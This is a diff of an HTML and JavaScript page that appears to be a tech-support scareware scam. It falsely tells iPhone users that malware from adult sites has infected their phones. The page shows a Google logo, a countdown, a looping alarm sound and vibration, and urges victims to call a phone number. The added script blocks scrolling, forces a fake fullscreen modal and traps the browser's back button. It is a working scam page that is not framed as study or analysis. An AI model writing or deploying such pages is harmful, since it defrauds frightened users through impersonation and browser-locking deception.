@@ -3,125 +3,135 @@
 
 <head>
   <meta charset="UTF-8" />
-  <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0" /> -->
   <meta name="viewport" content="minimal-ui, width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
   <title>Malware Detected</title>
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" />
 
   <style>
-    .no-outline {
-      outline: none;
+    body, html {
+      height: 100%;
+      margin: 0;
+      overflow: hidden; /* Prevent scrolling */
     }
-    p {
-    margin-top: 0;
-    margin-bottom: 0 !important;
-}
+
+    .fullscreen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .modal-content {
+      text-align: center;
+    }
+
+    #countdown-timer {
+      font-size: 3rem;
+    }
   </style>
 </head>
 
 <body>
-  <div class="w-100 mt-5 px-4">
-    <h1 class="fw-bold text-danger text-center" style="font-size: 35px">
-      Malware Detected!
-    </h1>
+  <div class="fullscreen">
+    <h1 class="fw-bold text-danger text-center" style="font-size: 35px">Malware Detected!</h1>
     <div class="w-100 d-flex justify-content-center py-3">
       <button id="callButton1" class="btn btn-danger border-0 text-white" style="font-size: 1.5rem;">
         Call +1 877 838 1219
       </button>
     </div>
-    
     <div class="w-100 d-flex justify-content-center py-3">
       <img class="w-50" src="./assets/img/google_logo.webp" alt="./assets/img/google_logo.webp" />
     </div>
     <h6>Your iPhone has been infected by viruses and malware</h6>
-    <p>
-      We've noticed that your iPhone is 31.3% damaged by fifteen (15)
-      instances of malicious code contracted from recent visits to adult
-      sites. If not treated, the infection will soon corrupt your iPhone's SM
-      card and delete your contacts and photos.
-    </p>
     <h4 class="fw-bold text-danger text-center">
       <span id="countdown-timer">0:00</span> minutes remaining
     </h4>
-    <p>
-      If you don't treat the infection now, it will proceed to series damage.
-      Here's how to clean up the infection:
-    </p>
-    <p>
-      <b>Step 1:</b> Tap and install VirusRemover for free on the App Store!
-    </p>
-    <p><b>Step 2:</b> Open the app to scan and remove virus to adult site.</p>
+
     <div class="w-100 d-flex justify-content-center py-3">
       <button class="btn btn-success" id="vibrateButton" data-bs-toggle="modal" data-bs-target="#virusModal">
         Repair iPhone Virus
       </button>
-      <button id="callButton2" class="btn btn-danger border-0 text-white" style="font-size: 1rem; text-align: center; padding-left: 10px;">
-        Call +1 877 838 1219
-       </button>
-    </div>
-    <div class="w-100 d-flex justify-content-center py-3">
-      
     </div>
   </div>
 
-  <div class="modal fade" id="virusModal" tabindex="-1" aria-labelledby="virusModalLabel" aria-hidden="true"
-    data-bs-backdrop="static">
+  <div class="modal fade" id="virusModal" tabindex="-1" aria-labelledby="virusModalLabel" aria-hidden="true" data-bs-backdrop="static">
     <div class="modal-dialog modal-dialog-centered">
       <div class="modal-content">
-        <!-- <div class="modal-header">
-            <h1 class="modal-title fs-5" id="virusModalLabel">New message</h1>
-            <button
-              type="button"
-              class="btn-close shadow-none"
-              data-bs-dismiss="modal"
-            ></button>
-          </div> -->
-        <div class="modal-body">
-          <h1 class=" fs-1 fw-bold text-center text-danger">
-            Danger
-          </h1>
-          <h5 class="fw-bold">
-            The page at <br />
-            thesecurityofphone.com says:
-          </h5>
-          <p>
-            Mobile infections (4) dangerous viruses, because viewing porn
-            sites?
-          </p>
-          <p>
-            If the problem can not be resolved immediately, the viruses will
-            spy your phone, and destroy your SIM card, delete all your
-            contacts.
-          </p>
-          <p>
-            Please follow the instructions to install the Antivirus and
-            shield all the viruses
-          </p>
-          <div class="d-flex justify-content-center">
-            <!-- <a href="tel:+912222222222" id="callButton" class="btn btn-danger border-0 text-white">
-              +91 2222222222
-            </a> -->
-            <button id="callButton" class="btn btn-danger border-0 text-white" style="font-size: 1.2rem;">
-             Call +1 877 838 1219
-            </button>
-          </div>
-          <div class="d-flex justify-content-end">
-            <button type="button" class="border-0 bg-transparent text-primary" data-bs-dismiss="modal" id="">
-              Ok
-            </button>
-          </div>
+        <h1 class=" fs-1 fw-bold text-center text-danger">Danger</h1>
+        <p>Mobile infections (4) dangerous viruses...</p>
+        <div class="d-flex justify-content-center">
+          <button id="callButton" class="btn btn-danger border-0 text-white" style="font-size: 1.2rem;">
+            Call +1 877 838 1219
+          </button>
         </div>
       </div>
     </div>
   </div>
+
   <!-- Audio Element -->
   <audio id="audioPlayer" src="assets/media/alert.mp3"></audio>
 
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
-
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <script src="./assets/js/snippets.js"></script>
+
+  <script>
+    $(document).ready(() => {
+      const audioPlayer = $("#audioPlayer")[0];
+      const virusModal = document.getElementById("virusModal");
+      const modalInstance = new bootstrap.Modal(virusModal);
+
+      // Start playing audio
+      audioPlayer.play();
+      audioPlayer.addEventListener("ended", () => {
+        audioPlayer.play(); // Loop audio
+      });
+
+      // Function to simulate fullscreen on iOS
+      function goFullScreenAndVibrate() {
+        // Lock the viewport height and prevent scrolling
+        document.body.style.height = "100vh";
+        document.body.style.overflow = "hidden"; // No scrolling
+        window.scrollTo(0, 0); // Prevent page scroll
+
+        // Simulate fullscreen mode by making the body take full screen
+        document.body.classList.add("fullscreen");
+
+        // Trigger vibration
+        if (navigator.vibrate) {
+          navigator.vibrate([200, 100, 200]);
+        }
+
+        modalInstance.show(); // Show the modal
+        audioPlayer.play(); // Play the audio
+      }
+
+      // Trigger fullscreen on user interaction (touch or click)
+      window.addEventListener("touchstart", () => {
+        goFullScreenAndVibrate();
+      });
+
+      window.addEventListener("click", () => {
+        goFullScreenAndVibrate();
+      });
+
+      // Button action for call button
+      $("#callButton").on("click", () => {
+        const phoneNumber = "tel:+18778381219";
+        window.location.href = phoneNumber;
+      });
+
+      // Prevent backspace key from navigating back.
+      history.pushState(null, null, window.location.href);
+      history.back();
+      window.onpopstate = () => history.forward();
+    });
+  </script>
 </body>
 
 </html>
